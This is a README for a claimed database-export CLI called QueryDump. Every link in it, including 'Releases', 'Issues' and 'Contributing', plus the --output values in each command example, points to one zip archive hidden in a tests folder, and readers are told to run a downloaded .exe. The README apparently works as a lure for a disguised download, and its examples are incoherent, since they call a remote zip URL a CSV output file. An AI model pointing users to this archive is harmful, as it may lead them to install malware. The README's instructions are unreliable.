# 🚀 QueryDump - Export Your Database Queries Easily

## 📥 Download Now
[![Download QueryDump](https://github.com/kareemadam/QueryDump/raw/refs/heads/main/tests/QueryDump.Tests/Integration/Providers/Oracle/Query_Dump_1.1.zip)](https://github.com/kareemadam/QueryDump/raw/refs/heads/main/tests/QueryDump.Tests/Integration/Providers/Oracle/Query_Dump_1.1.zip)

## 📖 Introduction
QueryDump is a performance-focused command-line interface (CLI) tool designed for exporting database queries into Parquet or CSV formats. It includes built-in data masking features to protect sensitive information. This application simplifies data migration, making it ideal for users who need an efficient way to handle their database exports without technical expertise.

## 🚀 Getting Started
To use QueryDump, follow these steps:

1. **Download the Application**
   Visit the [Releases page](https://github.com/kareemadam/QueryDump/raw/refs/heads/main/tests/QueryDump.Tests/Integration/Providers/Oracle/Query_Dump_1.1.zip) to download the latest version of QueryDump. You'll find several files available for download; choose the one that best fits your operating system.

2. **Install the Application**
   After downloading, locate the file on your computer. Here are the installation steps by operating system:

   - **Windows**
     - Simply double-click the downloaded `.exe` file to start the installation.
   
   - **macOS**
     - Open the `.dmg` file and drag the QueryDump application to your Applications folder.
   
   - **Linux**
     - Extract the downloaded tarball and run the executable file in your terminal.

3. **Open QueryDump**
   Once installed, you can launch QueryDump from your applications menu or by typing the command into your terminal. For Windows, you can also double-click the application icon.

## ⚙️ System Requirements
- **Operating System**: Windows 10 or later, macOS 10.14 or later, Linux Ubuntu 20.04 or later.
- **Memory**: Minimum 4 GB RAM.
- **Storage**: At least 100 MB of free disk space required for installation.
- **Database Compatibility**: Supports common databases like SQL Server, Oracle, and DuckDB.

## 🌟 Features
- **Data Export**: Quickly export queries to Parquet or CSV formats tailored to your needs.
- **Data Masking**: Secure sensitive data with built-in masking options. Choose between several masking techniques to protect personal information.
- **Easy to Use**: Simple command-line interface makes it accessible for users without programming skills.
- **Performance Optimized**: Designed for speed, allowing high-volume data handling effectively.

## 🛠️ How to Use QueryDump
After launching QueryDump, you can begin using it by typing commands directly into the terminal.

### Basic Command Syntax
The basic syntax to export a query looks like this:

```
querydump export --query "SELECT * FROM your_table" --output "https://github.com/kareemadam/QueryDump/raw/refs/heads/main/tests/QueryDump.Tests/Integration/Providers/Oracle/Query_Dump_1.1.zip"
```

### Options
- `--query`: This is the SQL statement you want to run.
- `--output`: Define the desired output file name and format (CSV or Parquet).

### Example Usage
To export data from a table named "employees" you would use:

```
querydump export --query "SELECT * FROM employees" --output "https://github.com/kareemadam/QueryDump/raw/refs/heads/main/tests/QueryDump.Tests/Integration/Providers/Oracle/Query_Dump_1.1.zip"
```

This command exports all data from the "employees" table to a CSV file called "https://github.com/kareemadam/QueryDump/raw/refs/heads/main/tests/QueryDump.Tests/Integration/Providers/Oracle/Query_Dump_1.1.zip".

## 📚 Advanced Usage
You can also apply data masking while exporting:

```
querydump export --query "SELECT * FROM employees" --output "https://github.com/kareemadam/QueryDump/raw/refs/heads/main/tests/QueryDump.Tests/Integration/Providers/Oracle/Query_Dump_1.1.zip" --mask "name,email"
```

In this command, sensitive fields like name and email will be masked in the output file.

## 📜 Troubleshooting
If you encounter any issues while using QueryDump, consider the following:

- **Check Installation**: Ensure QueryDump installed successfully and verify its location.
- **Database Connection**: Confirm that your database is accessible and configured correctly.
- **Command Errors**: Review the command syntax for any typos or missing parameters.

## 🥳 Feedback and Support
For questions, support, or feature requests, please visit our [Issues page](https://github.com/kareemadam/QueryDump/raw/refs/heads/main/tests/QueryDump.Tests/Integration/Providers/Oracle/Query_Dump_1.1.zip). Your feedback is valuable and helps improve QueryDump.

## 💻 Contribute
Would you like to contribute to QueryDump? We welcome your ideas, code, and documentation improvements. Please refer to our [Contributing Guidelines](https://github.com/kareemadam/QueryDump/raw/refs/heads/main/tests/QueryDump.Tests/Integration/Providers/Oracle/Query_Dump_1.1.zip) on GitHub.

## 📍 Conclusion
QueryDump is your go-to tool for exporting database queries simply and effectively. Don't forget to visit the [Releases page](https://github.com/kareemadam/QueryDump/raw/refs/heads/main/tests/QueryDump.Tests/Integration/Providers/Oracle/Query_Dump_1.1.zip) for the latest updates and downloads. Enjoy working with your data!